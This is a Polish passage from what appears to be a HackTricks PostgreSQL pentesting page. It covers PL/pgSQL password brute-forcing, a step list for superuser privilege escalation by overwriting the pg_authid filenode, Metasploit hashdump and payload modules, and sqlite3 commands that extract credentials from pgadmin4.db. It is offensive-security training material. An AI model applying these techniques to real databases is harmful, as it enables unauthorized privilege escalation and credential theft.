**PL/pgSQL** to **w pełni funkcjonalny język programowania**, który oferuje większą kontrolę proceduralną w porównaniu do SQL. Umożliwia użycie **pętli** i innych **struktur kontrolnych** w celu ulepszenia logiki programu. Ponadto, **instrukcje SQL** i **wyzwalacze** mają zdolność wywoływania funkcji stworzonych za pomocą **języka PL/pgSQL**. Ta integracja pozwala na bardziej kompleksowe i wszechstronne podejście do programowania i automatyzacji baz danych.\
**Możesz nadużyć tego języka, aby poprosić PostgreSQL o przeprowadzenie ataku brute-force na dane logowania użytkowników.**

{{#ref}}
../pentesting-web/sql-injection/postgresql-injection/pl-pgsql-password-bruteforce.md
{{#endref}}

### Privesc przez Nadpisanie Wewnętrznych Tabel PostgreSQL

> [!NOTE]
> Poniższy wektor privesc jest szczególnie przydatny w ograniczonych kontekstach SQLi, ponieważ wszystkie kroki można wykonać za pomocą zagnieżdżonych instrukcji SELECT

Jeśli możesz **czytać i pisać pliki serwera PostgreSQL**, możesz **stać się superużytkownikiem** przez nadpisanie węzła pliku na dysku PostgreSQL, związanego z wewnętrzną tabelą `pg_authid`.

Przeczytaj więcej o **tej technice** [**tutaj**](https://adeadfed.com/posts/updating-postgresql-data-without-update/)**.**

Kroki ataku to:

1. Uzyskaj katalog danych PostgreSQL
2. Uzyskaj względną ścieżkę do węzła pliku, związanego z tabelą `pg_authid`
3. Pobierz węzeł pliku za pomocą funkcji `lo_*`
4. Uzyskaj typ danych, związany z tabelą `pg_authid`
5. Użyj [PostgreSQL Filenode Editor](https://github.com/adeadfed/postgresql-filenode-editor), aby [edytować węzeł pliku](https://adeadfed.com/posts/updating-postgresql-data-without-update/#privesc-updating-pg_authid-table); ustaw wszystkie flagi boolean `rol*` na 1 dla pełnych uprawnień.
6. Ponownie załaduj edytowany węzeł pliku za pomocą funkcji `lo_*` i nadpisz oryginalny plik na dysku
7. _(Opcjonalnie)_ Wyczyść pamięć podręczną tabeli w pamięci, uruchamiając kosztowne zapytanie SQL
8. Teraz powinieneś mieć uprawnienia pełnego superadmina.

## **POST**
```
msf> use auxiliary/scanner/postgres/postgres_hashdump
msf> use auxiliary/scanner/postgres/postgres_schemadump
msf> use auxiliary/admin/postgres/postgres_readfile
msf> use exploit/linux/postgres/postgres_payload
msf> use exploit/windows/postgres/postgres_payload
```
### logging

W pliku _**postgresql.conf**_ możesz włączyć logi postgresql, zmieniając:
```bash
log_statement = 'all'
log_filename = 'postgresql-%Y-%m-%d_%H%M%S.log'
logging_collector = on
sudo service postgresql restart
#Find the logs in /var/lib/postgresql/<PG_Version>/main/log/
#or in /var/lib/postgresql/<PG_Version>/main/pg_log/
```
Następnie, **uruchom ponownie usługę**.

### pgadmin

[pgadmin](https://www.pgadmin.org) to platforma administracyjna i deweloperska dla PostgreSQL.\
Możesz znaleźć **hasła** w pliku _**pgadmin4.db**_\
Możesz je odszyfrować za pomocą funkcji _**decrypt**_ w skrypcie: [https://github.com/postgres/pgadmin4/blob/master/web/pgadmin/utils/crypto.py](https://github.com/postgres/pgadmin4/blob/master/web/pgadmin/utils/crypto.py)
```bash
sqlite3 pgadmin4.db ".schema"
sqlite3 pgadmin4.db "select * from user;"
sqlite3 pgadmin4.db "select * from server;"
string pgadmin4.db
```
### pg_hba

Uwierzytelnianie klientów w PostgreSQL jest zarządzane przez plik konfiguracyjny o nazwie **pg_hba.conf**. Plik ten zawiera szereg rekordów, z których każdy określa typ połączenia, zakres adresów IP klientów (jeśli dotyczy), nazwę bazy danych, nazwę użytkownika oraz metodę uwierzytelniania, która ma być użyta do dopasowania połączeń. Pierwszy rekord, który pasuje do typu połączenia, adresu klienta, żądanej bazy danych i nazwy użytkownika, jest używany do uwierzytelniania. Nie ma możliwości przywrócenia lub zapasowego rozwiązania, jeśli uwierzytelnianie się nie powiedzie. Jeśli żaden rekord nie pasuje, dostęp jest odmawiany.

Dostępne metody uwierzytelniania oparte na haśle w pg_hba.conf to **md5**, **crypt** i **password**. Metody te różnią się sposobem przesyłania hasła: haszowane MD5, szyfrowane crypt lub w postaci czystego tekstu. Ważne jest, aby zauważyć, że metoda crypt nie może być używana z hasłami, które zostały zaszyfrowane w pg_authid.

{{#include ../banners/hacktricks-training.md}}

<figure><img src="../images/image (48).png" alt=""><figcaption></figcaption></figure>

\
Użyj [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=pentesting-postgresql), aby łatwo budować i **automatyzować przepływy pracy** zasilane przez **najbardziej zaawansowane** narzędzia społecznościowe na świecie.\
Uzyskaj dostęp już dziś:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=pentesting-postgresql" %}
